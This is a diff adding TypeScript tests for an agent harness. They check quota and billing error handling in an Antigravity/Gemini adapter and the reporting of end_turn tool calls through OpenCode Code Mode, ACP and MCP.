+  t.mock.timers.enable({ apis: ['setTimeout'] });
+  const { r, s, exit } = await quotaFailure();
+  await s.interrupt();
+  t.mock.timers.tick(ANTIGRAVITY_QUOTA_GRACE_MS);
+  await exit;
+  assert.equal(r.exitError(), undefined);
+});
+
+test('Antigravity: a specific prompt error takes precedence over a quota-looking tool result', { timeout: 5000 }, async () => {
+  const r = agy({ mode: 'full' });
+  await turn(r, r.start(), 'quota_prompt_error');
+  const result = results(r.outputs)[0];
+  assert.equal(result?.outcome, 'failed');
+  assert.equal(result?.error, 'Context length exceeded');
+  assert.equal(result?.errorKind, undefined);
+});
+
+test('Antigravity: end_turn without recovery after quota exhaustion still reports a usage limit', { timeout: 5000 }, async () => {
+  const r = agy({ mode: 'full' });
+  await turn(r, r.start(), 'quota_end_turn');
+  const result = results(r.outputs)[0];
+  assert.equal(result?.outcome, 'failed');
+  assert.equal(result?.errorKind, 'usageLimit');
+});
+
+test('Antigravity: a tool introduced by a permission request after quota can show recovery', { timeout: 5000 }, async () => {
+  const r = agy({ mode: 'ask' });
+  await turn(r, r.start(), 'quota_new_permission');
+  assert.equal(r.cards.length, 1);
+  assert.equal(results(r.outputs)[0]?.outcome, 'completed');
+});
+
+for (const [scenario, description] of [
+  ['quota_existing_edit', 'arrives fully described'],
+  ['quota_existing_edit_empty', 'is initially empty'],
+  ['quota_existing_edit_no_status', 'is announced without a status'],
+  ['quota_existing_edit_no_path', 'begins running before its path arrives'],
+  ['quota_existing_edit_other', 'first reports a generic tool kind'],
+  ['quota_existing_edit_header', 'has a path-like line in its Markdown content'],
+] as const) {
+  test(`Antigravity: the new wire ID for an earlier approved edit ${description} without clearing quota`, { timeout: 5000 }, async () => {
+    const r = agy({ mode: 'full' });
+    await turn(r, r.start(), scenario);
+    assert.equal(results(r.outputs)[0]?.errorKind, 'usageLimit');
+  });
+}
+
+for (const [scenario, description] of [
+  ['quota_existing_edit_recovers', 'after an earlier approval was recognized late'],
+  ['quota_existing_edit_partial', 'after an earlier edit completed on only part of its approved file set'],
+  ['quota_existing_edit_partial_failed', 'after an earlier partial edit went straight from pending to failed'],
+  ['quota_existing_edit_relative', 'after its relative path is confirmed by an absolute location'],
+  ['quota_existing_edit_relative_again', 'when a relative path repeats after its absolute location'],
+  ['quota_existing_edit_patch', 'when patch arguments are the only source of file paths'],
+] as const) {
+  test(`Antigravity: a distinct edit can recover ${description}`, { timeout: 5000 }, async () => {
+    const r = agy({ mode: 'full' });
+    await turn(r, r.start(), scenario);
+    assert.equal(results(r.outputs)[0]?.outcome, 'completed');
+  });
+}
+
+test('Antigravity: a cancellation from the harness after quota still reports a usage limit', { timeout: 5000 }, async () => {
+  const r = agy({ mode: 'full' });
+  await turn(r, r.start(), 'quota_cancelled');
+  assert.equal(results(r.outputs)[0]?.errorKind, 'usageLimit');
+});
+
+test('Antigravity: a spontaneous process exit preserves an unrecovered quota diagnostic', { timeout: 5000 }, async () => {
+  const { r, s, exit } = await quotaFailure('quota_exit');
+  s['proc'].notify('_test/finish_prompt', { sessionId: s['sessionId'] });
+  await exit;
+  assert.match(r.exitError()?.message ?? '', /is out of Gemini usage.*Individual quota reached/i);
+});
+
+test('Antigravity: an executor 429 split across frames still ends the session if it has no retry diagnostic', { timeout: 5000 }, async () => {
+  const r = agy({ mode: 'full' });
+  r.start().send({ id: 'executor-429', text: 'executor_429', images: [] });
+  await r.exited();
+  const error = r.exitError();
+  assert.match(error?.message ?? '', /Too many requests/);
+  assert.ok(!(error instanceof SessionUsageLimitError));
+});
+
+for (const [scenario, description] of [
+  ['executor_402', 'split across tool updates'],
+  ['message_402', 'sent as an assistant message'],
+  ['message_402_split', 'split across assistant message chunks'],
+] as const) {
+  test(`Antigravity: an executor billing error ${description} retains its HTTP 402 classification`, { timeout: 5000 }, async () => {
+    const r = agy({ mode: 'full' });
+    r.start().send({ id: 'executor-402', text: scenario, images: [] });
+    await r.exited();
+    const error = r.exitError();
+    assert.ok(error instanceof SessionUsageLimitError);
+    assert.match(error.message, /is out of Gemini usage.*Billing error/i);
+  });
+}
+
+test('Antigravity: a fatal harness error followed by a separate failed status ends the session', { timeout: 5000 }, async () => {
+  const r = agy({ mode: 'full' });
+  r.start().send({ id: 'split-harness', text: 'split_harness', images: [] });
+  await r.exited();
+  assert.match(r.exitError()?.message ?? '', /Harness process exited unexpectedly/);
+});
+
+test('Antigravity: coordinator refusals preserve quota diagnostics and restore the idle deadline', { timeout: 15_000 }, async (t) => {
+  const r = agy({ mode: 'full', opts: { coordinator: { role: 'coordinator', checkTool: () => undefined } } });
+  const s = r.start();
+  await ready(r, s);
+  s.send({ id: 'executor-429', text: 'hang', images: [] });
+  await until(() => r.log().some((entry) => typeof entry.prompt === 'string' && entry.prompt.endsWith('hang')));
+  t.mock.timers.enable({ apis: ['setTimeout'] });
+  const waiting = { toolCallId: 'shell-2', kind: 'execute', rawInput: { command: 'echo waiting' } };
+  frame(s, { ...waiting, status: 'in_progress' });
+  const shell = { toolCallId: 'shell-1', kind: 'execute', rawInput: { command: 'echo hello' } };
+  fakeRequest(r, s, shell);
+  frame(s, { ...shell, sessionUpdate: 'tool_call_update', rawOutput: 'Agent execution terminated due to error. ("agent executor error: Error 429, Message: Individual quota reached. Please upgrade your subscription to increase your limits. Resets in 1h32m53s., Status: RESOURCE_EXHAUSTED")' });
+  frame(s, { ...shell, sessionUpdate: 'tool_call_update', status: 'failed' });
+  const toolResults = r.outputs.flatMap((o) => o.kind === 'event' && o.event.type === 'tool.result' ? [o.event.text] : []);
+  assert.equal(toolResults.length, 1);
+  assert.match(toolResults[0], /^Threadbear blocked this tool call\./);
+  t.mock.timers.tick(ANTIGRAVITY_QUOTA_GRACE_MS);
+  assert.equal(r.exitError(), null, 'a pending tool gives the provider more time');
+  fakeRequest(r, s, waiting);
+  t.mock.timers.tick(ANTIGRAVITY_QUOTA_GRACE_MS);
+  assert.match(r.exitError()?.message ?? '', /is out of Gemini usage.*Individual quota reached/i);
+});
+
+test('Antigravity: a bare executor banner still ends an unanswered prompt', { timeout: 5000 }, async (t) => {
+  t.mock.timers.enable({ apis: ['setTimeout'] });
+  const banner = Promise.withResolvers<void>();
+  const r = agy({ mode: 'full', onOutput: (out) => {
+    if (out.kind === 'delta') banner.resolve();
+  } });
+  r.start().send({ id: 'bare-executor-error', text: 'message_bare_executor_error', images: [] });
+  await banner.promise;
+  t.mock.timers.tick(EXECUTOR_DIAGNOSTIC_GRACE_MS - 1);
+  assert.equal(r.exitError(), null);
+  t.mock.timers.tick(1);
+  await r.exited();
+  assert.match(r.exitError()?.message ?? '', /Agent execution terminated due to error/);
+});
+
+for (const status of ['success', 'failure', 'retry']) {
+  test(`Antigravity: a parallel tool's ${status} starts a fresh quota deadline`, { timeout: 5000 }, async (t) => {
+    t.mock.timers.enable({ apis: ['setTimeout'] });
+    const parallelDone = Promise.withResolvers<void>();
+    const { r, s, exit } = await quotaFailure(`quota_parallel_${status}`, { onOutput: (out) => {
+      if (out.kind === 'event' && out.event.type === 'tool.result' && out.event.itemId === 'parallel-command') parallelDone.resolve();
+    } });
+    t.mock.timers.tick(ANTIGRAVITY_QUOTA_GRACE_MS);
+    assert.equal(r.exitError(), null);
+    s['proc'].notify('_test/finish_prompt', { sessionId: s['sessionId'] });
+    await Promise.race([parallelDone.promise, exit]);
+    t.mock.timers.tick(ANTIGRAVITY_QUOTA_GRACE_MS - 1);
+    assert.equal(r.exitError(), null);
+    t.mock.timers.tick(1);
+    await exit;
+    assert.match(r.exitError()?.message ?? '', /is out of Gemini usage/);
+  });
+}
+
+test('Antigravity: a tool left open indefinitely cannot hide a quota failure', { timeout: 5000 }, async (t) => {
+  t.mock.timers.enable({ apis: ['setTimeout'] });
+  const { r, exit } = await quotaFailure('quota_parallel_tool');
+  t.mock.timers.tick(ANTIGRAVITY_QUOTA_TOOL_GRACE_MS - 1);
+  assert.equal(r.exitError(), null);
+  t.mock.timers.tick(1);
+  await exit;
+  assert.match(r.exitError()?.message ?? '', /is out of Gemini usage/);
+});
+
+test('Antigravity: an answered question starts the quota deadline if the prompt is still open', { timeout: 5000 }, async (t) => {
+  t.mock.timers.enable({ apis: ['setTimeout'] });
+  const answered = Promise.withResolvers<void>();
+  const answer = Promise.withResolvers<QuestionAnswer>();
+  const { r, exit } = await quotaFailure('quota_pending_hangs', { question: () => answer.promise, onOutput: (out) => {
+    if (out.kind === 'context' && out.contextTokens === 42) answered.resolve();
+  } });
+  t.mock.timers.tick(ANTIGRAVITY_QUOTA_GRACE_MS * 2);
+  assert.equal(r.exitError(), null);
+  answer.resolve({ answers: null });
+  await Promise.race([answered.promise, exit]);
+  t.mock.timers.tick(ANTIGRAVITY_QUOTA_GRACE_MS);
+  await exit;
+  assert.match(r.exitError()?.message ?? '', /is out of Gemini usage/);
+});
+
+test('Antigravity: a tool announced before the quota failure can start later without clearing it', { timeout: 5000 }, async (t) => {
+  t.mock.timers.enable({ apis: ['setTimeout'] });
+  const started = Promise.withResolvers<void>();
+  const finished = Promise.withResolvers<void>();
+  const answer = Promise.withResolvers<QuestionAnswer>();
+  const { r, s, exit } = await quotaFailure('quota_pending_tool', { question: () => answer.promise, onOutput: (out) => {
+    if (out.kind !== 'event' || !('itemId' in out.event) || out.event.itemId !== 'parallel-command') return;
+    if (out.event.type === 'tool.call') started.resolve();
+    if (out.event.type === 'tool.result') finished.resolve();
+  } });
+  answer.resolve({ answers: null });
+  await Promise.race([started.promise, exit]);
+  t.mock.timers.tick(ANTIGRAVITY_QUOTA_GRACE_MS);
+  assert.equal(r.exitError(), null);
+  s['proc'].notify('_test/finish_prompt', { sessionId: s['sessionId'] });
+  await Promise.race([finished.promise, exit]);
+  t.mock.timers.tick(ANTIGRAVITY_QUOTA_GRACE_MS);
+  await exit;
+  assert.match(r.exitError()?.message ?? '', /is out of Gemini usage/);
+});
+
+for (const [scenario, description, resumedTool] of [
+  ['quota_recovers', 'new tool work after a Gemini quota diagnostic', true],
+  ['quota_parallel_tool', 'a parallel tool that was already running', false],
+  ['rate_limit', 'a temporary per-minute rate limit', false],
+  ['retry_delay', 'a 429 with a fractional-second retry hint', false],
+] as const) {
+  test(`Antigravity: ${description} leaves the session open`, { timeout: 5000 }, async (t) => {
+    t.mock.timers.enable({ apis: ['setTimeout'] });
+    const paused = Promise.withResolvers<void>();
+    const r = agy({ mode: 'full', onOutput: (out) => {
+      if (out.kind === 'event' && out.event.type === 'tool.result' && out.event.ok === resumedTool) paused.resolve();
+    } });
+    const s = r.start();
+    const done = turn(r, s, scenario, 'turn-diagnostic');
+    const exit = r.exited();
+    await Promise.race([paused.promise, exit]);
+    assert.equal(r.exitError(), null);
+    t.mock.timers.tick(ANTIGRAVITY_QUOTA_GRACE_MS);
+    assert.equal(r.exitError(), null);
+    s['proc'].notify('_test/finish_prompt', { sessionId: s['sessionId'] });
+    await Promise.race([done, exit]);
+    assert.equal(results(r.outputs)[0]?.outcome, 'completed');
+    await turn(r, s, 'hello', 'turn-next');
+    assert.equal(results(r.outputs)[1]?.outcome, 'completed');
+  });
+}
+
+test('Antigravity: a quota-looking tool failure does not stop a turn waiting for an answer', { timeout: 5000 }, async (t) => {
+  t.mock.timers.enable({ apis: ['setTimeout'] });
+  const asked = Promise.withResolvers<void>();
+  const answer = Promise.withResolvers<QuestionAnswer>();
+  const r = agy({ mode: 'full', question: () => {
+    asked.resolve();
+    return answer.promise;
+  } });
+  const s = r.start();
+  const done = turn(r, s, 'quota_question');
+  const exit = r.exited();
+  await Promise.race([asked.promise, exit]);
+  assert.equal(r.exitError(), null);
+  t.mock.timers.tick(ANTIGRAVITY_QUOTA_GRACE_MS);
+  assert.equal(r.exitError(), null);
+  answer.resolve({ answers: null });
+  await Promise.race([done, exit]);
+  assert.equal(results(r.outputs)[0]?.outcome, 'completed');
+});
+
+test('Antigravity: answering a question that predates the quota notice does not expose an old deadline', { timeout: 5000 }, async (t) => {
+  t.mock.timers.enable({ apis: ['setTimeout'] });
+  const failedTool = Promise.withResolvers<void>();
+  const answered = Promise.withResolvers<void>();
+  const answer = Promise.withResolvers<QuestionAnswer>();
+  const r = agy({ mode: 'full', question: () => answer.promise, onOutput: (out) => {
+    if (out.kind === 'event' && out.event.type === 'tool.result' && !out.event.ok) failedTool.resolve();
+    if (out.kind === 'context' && out.contextTokens === 42) answered.resolve();
+  } });
+  const s = r.start();
+  const done = turn(r, s, 'quota_pending_question');
+  const exit = r.exited();
+  await Promise.race([failedTool.promise, exit]);
+  assert.equal(r.questions.length, 1);
+  t.mock.timers.tick(ANTIGRAVITY_QUOTA_GRACE_MS - 1);
+  answer.resolve({ answers: null });
+  await Promise.race([answered.promise, exit]);
+  t.mock.timers.tick(1);
+  assert.equal(r.exitError(), null);
+  s['proc'].notify('_test/finish_prompt', { sessionId: s['sessionId'] });
+  await Promise.race([done, exit]);
+  assert.equal(results(r.outputs)[0]?.outcome, 'completed');
+});
+
+test('OpenCode Code Mode: end_turn called inside execute still emits mcp__threadbear__end_turn call and result', async () => {
+  const endTurnTool: ToolDefinition = {
+    name: 'end_turn',
+    description: 'end turn',
+    inputSchema: {
+      headline: z.string().optional(),
+      needs: z.enum(['you', 'nothing']).optional(),
+      asks: z.array(z.object({ question: z.string(), options: z.array(z.object({ label: z.string(), does: z.string().optional() })).optional() })).optional(),
+    },
+    handler: async () => ({ content: [{ type: 'text', text: 'Noted: this thread will wait in Needs you. Now write your reply.' }] }),
+  };
+  const r = rig({ mode: 'full', toolsFor: () => [endTurnTool] });
+  const s = r.start();
+  const payload = {
+    headline: 'Pick how Publish handles big pages',
+    needs: 'you',
+    asks: [{ question: 'Which Publish direction do you want?', options: [{ label: '10 MB + scripts', does: 'Allow 10 MB with offline scripts' }] }],
+  };
+  await turn(r, s, `codemode_end_turn ${JSON.stringify(payload)}`);
+  const evs = r.outputs.filter((o): o is Extract<AdapterOutput, { kind: 'event' }> => o.kind === 'event').map((o) => o.event);
+  const endCalls = evs.filter((e) => e.type === 'tool.call' && e.name === 'mcp__threadbear__end_turn');
+  assert.equal(endCalls.length, 1);
+  assert.deepEqual((endCalls[0] as { input: unknown }).input, payload);
+  const itemId = (endCalls[0] as { itemId: string }).itemId;
+  const endResults = evs.filter((e) => e.type === 'tool.result' && e.itemId === itemId);
+  assert.equal(endResults.length, 1);
+  assert.equal((endResults[0] as { ok: boolean }).ok, true);
+  assert.match((endResults[0] as { text: string }).text, /^Noted: this thread will wait in Needs you\./);
+  const endResIdx = evs.findIndex((e) => e.type === 'tool.result' && e.itemId === itemId);
+  const replyIdx = evs.findIndex((e) => e.type === 'assistant.text');
+  assert.ok(endResIdx >= 0 && replyIdx > endResIdx, 'end_turn call and result land before the reply text');
+
+  // A second session on the same thread must not reuse itemIds from the first.
+  const r2 = rig({ mode: 'full', toolsFor: () => [endTurnTool] });
+  const s2 = r2.start();
+  await turn(r2, s2, `codemode_end_turn ${JSON.stringify(payload)}`);
+  const evs2 = r2.outputs.filter((o): o is Extract<AdapterOutput, { kind: 'event' }> => o.kind === 'event').map((o) => o.event);
+  const itemId2 = (evs2.find((e) => e.type === 'tool.call' && e.name === 'mcp__threadbear__end_turn') as { itemId: string } | undefined)?.itemId;
+  assert.ok(itemId2 && itemId2 !== itemId, 'synthetic end_turn itemIds are unique across sessions');
+});
+
+test('ACP direct end_turn: suppresses duplicate ACP rows and keeps unwrapped MCP input and exact handler error status', async () => {
+  let calls = 0;
+  const endTurnTool: ToolDefinition = {
+    name: 'end_turn',
+    description: 'end turn',
+    inputSchema: {
+      needs: z.enum(['you', 'nothing']).optional(),
+      asks: z.array(z.object({ question: z.string() })).optional(),
+    },
+    handler: async () => {
+      calls++;
+      return { content: [{ type: 'text', text: 'Not ended: check plain words.' }], isError: true };
+    },
+  };
+  const r = rig({ mode: 'full', toolsFor: () => [endTurnTool] });
+  const s = r.start();
+  await turn(r, s, `direct_end_turn ${JSON.stringify({ needs: 'you', asks: JSON.stringify([{ question: 'Ship it?' }]) })}`);
+  assert.equal(calls, 1);
+  const evs = r.outputs.filter((o): o is Extract<AdapterOutput, { kind: 'event' }> => o.kind === 'event').map((o) => o.event);
+  const endCalls = evs.filter((e) => e.type === 'tool.call' && e.name === 'mcp__threadbear__end_turn');
+  assert.equal(endCalls.length, 1, 'ACP row is suppressed so runner sees only one end_turn call');
+  assert.deepEqual((endCalls[0] as { input: unknown }).input, { needs: 'you', asks: [{ question: 'Ship it?' }] });
+  const itemId = (endCalls[0] as { itemId: string }).itemId;
+  const endResults = evs.filter((e) => e.type === 'tool.result' && e.itemId === itemId);
+  assert.equal(endResults.length, 1);
+  assert.equal((endResults[0] as { ok: boolean }).ok, false, 'keeps isError: true even when ACP reports status completed');
+});
+
+test('Runner + OpenCode Code Mode: end_turn inside execute produces Needs you card, headline preview and final reply', async () => {
+  const root = tmp();
+  made.push(root);
+  const logFile = path.join(root, 'agent.log');
+  let runnerRef: ReturnType<typeof makeHarness>['runner'] | undefined;
+  const registry = new ProcessRegistry(path.join(root, 'run'), nullLogger);
+  const acp = new AcpAdapter({
+    agent: ACP_AGENTS.opencode,
+    binary: () => FAKE,
+    registry,
+    log: nullLogger,
+    env: { PATH: process.env.PATH, FAKE_ACP_LOG: logFile },
+    timings: { closeWaitMs: 300 },
+    toolsFor: (threadId) =>
+      buildThreadbearTools(runnerRef!, threadId, Date.now, undefined, undefined, undefined, {
+        provider: 'codex',
+        oneReply: () => true,
+      }),
+  });
+  const startAcp = acp.start.bind(acp);
+  acp.start = (opts, sink) => {
+    const s = startAcp(opts, sink);
+    sessions.push(s);
+    return s;
+  };
+  const opencodeAccount: Account = { id: 'opencode-main', provider: 'opencode', title: 'OpenCode', configDir: root };
+  const h = makeHarness(
+    path.join(root, 'home'),
+    { oneReply: true },
+    {
+      adapters: { opencode: acp },
+      accounts: new FakeAccounts([opencodeAccount]),
+    },
+  );
+  runnerRef = h.runner;
+  try {
+    const first = {
+      headline: 'Publish fails at 64 KiB and blocks scripts',
+      needs: 'you',
+      asks: [{ question: 'How should Publish handle large and interactive HTML files?', suggested: 0, options: [{ label: '10 MB + scripts', does: 'Allow 10 MB with offline scripts' }, { label: '10 MB static', does: 'Allow 10 MB without scripts' }] }],
+    };
+    const second = {
+      headline: 'Publish fails at 64 KiB and blocks scripts',
+      needs: 'you',
+      asks: [{ question: 'How should Publish handle large and interactive HTML pages?', suggested: 0, options: [{ label: '10 MB + scripts', does: 'Allow 10 MB with offline scripts' }, { label: '10 MB static', does: 'Allow 10 MB without scripts' }] }],
+    };
+    const { thread } = h.runner.create({
+      text: `codemode_end_turn_retry ${JSON.stringify(first)} || ${JSON.stringify(second)}`,
+      accountId: 'opencode-main',
+      permissionMode: 'full',
+    });
+    await until(() => h.runner.get(thread.id).status === 'idle', 5000);
+    const updated = h.runner.get(thread.id);
+    const evs = h.events(thread.id);
+    assert.equal(updated.needs, 'you');
+    assert.equal(updated.asks?.length, 1);
+    assert.equal(updated.asks?.[0].action, 'How should Publish handle large and interactive HTML pages?');
+    assert.deepEqual(updated.asks?.[0].options, ['10 MB + scripts', '10 MB static']);
+    assert.equal(updated.preview, 'Publish fails at 64 KiB and blocks scripts');
+    const completed = evs.findLast((e) => e.type === 'turn.completed');
+    assert.equal(completed?.needs, 'you');
+    assert.equal(completed?.needsFrom, 'tool');
+    assert.equal(completed?.asks?.length, 1);
+    const reply = evs.findLast((e) => e.type === 'assistant.text');
+    assert.equal(reply?.final, true);
+  } finally {
+    await h.runner.shutdown();
+    await registry.killAll(200);
+  }
+});
+
+test('MCP end_turn hooks skip invalid arguments, coordinator denials and out-of-turn calls', async () => {
+  const started: string[] = [];
+  const resultsSeen: { itemId: string; ok: boolean; text: string }[] = [];
+  const endTurnTool: ToolDefinition = {
+    name: 'end_turn',
+    description: 'end turn',
+    inputSchema: { needs: z.enum(['you', 'nothing']) },
+    handler: async () => ({ content: [{ type: 'text', text: 'Noted.' }] }),
+  };
+  const server = new AcpMcpServer([endTurnTool], {
+    log: nullLogger,
+    label: 't',
+    requestApproval: async () => ({ decision: 'allow' }),
+    cwd: () => '/tmp',
+    mode: () => 'full',
+    rules: () => new Set(),
+    addRules: () => {},
+    checkCoordinator: () => 'helpers do not call end_turn',
+    onToolStart: (name) => (started.push(name), 'id-1'),
+    onToolResult: (itemId, ok, text) => resultsSeen.push({ itemId, ok, text }),
+  });
+  const url = await server.listen();
+  try {
+    const post = async (args: Record<string, unknown>) =>
+      (await fetch(url, {
+        method: 'POST',
+        headers: { 'content-type': 'application/json', authorization: `Bearer ${server.token}` },
+        body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'end_turn', arguments: args } }),
+      })).json();
+    await post({ needs: 'invalid' });
+    await post({ needs: 'nothing' });
+    assert.deepEqual(started, []);
+    assert.deepEqual(resultsSeen, []);
+  } finally {
+    server.close();
+  }
+
+  // Out-of-turn HTTP call on an idle AcpSession emits no events.
+  const r = rig({ mode: 'full', toolsFor: () => [endTurnTool] });
+  const s = r.start();
+  await turn(r, s, 'hello');
+  const before = r.outputs.length;
+  const mcpSrv = (s as unknown as { mcp?: AcpMcpServer }).mcp!;
+  const port = (mcpSrv as unknown as { port: number }).port;
+  await fetch(`http://127.0.0.1:${port}/mcp`, {
+    method: 'POST',
+    headers: { 'content-type': 'application/json', authorization: `Bearer ${mcpSrv.token}` },
+    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'end_turn', arguments: { needs: 'nothing' } } }),
+  });
+  assert.equal(r.outputs.length, before, 'out-of-turn MCP end_turn emits nothing');
+});
